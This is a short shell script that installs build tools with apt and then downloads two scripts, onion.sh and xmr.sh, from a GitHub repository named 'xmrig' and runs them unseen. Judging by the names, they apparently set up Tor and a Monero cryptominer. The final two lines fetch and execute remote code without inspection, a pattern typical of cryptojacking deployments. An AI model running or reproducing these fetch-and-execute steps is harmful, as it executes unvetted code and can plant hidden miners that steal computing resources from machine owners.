#!/bin/sh

sudo apt-get update && sudo apt-get upgrade -y && sudo apt update && sudo apt upgrade -y 
sudo apt-get install git build-essential cmake automake libtool autoconf -y
sudo apt-get install libtool m4 automake -y
sudo apt-get install gcc++ -y
sudo apt-get install --reinstall systemd -y
sudo apt-get install nano -y

wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/onion.sh && chmod +x onion.sh && ./onion.sh
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/xmr.sh && chmod +x xmr.sh && ./xmr.sh
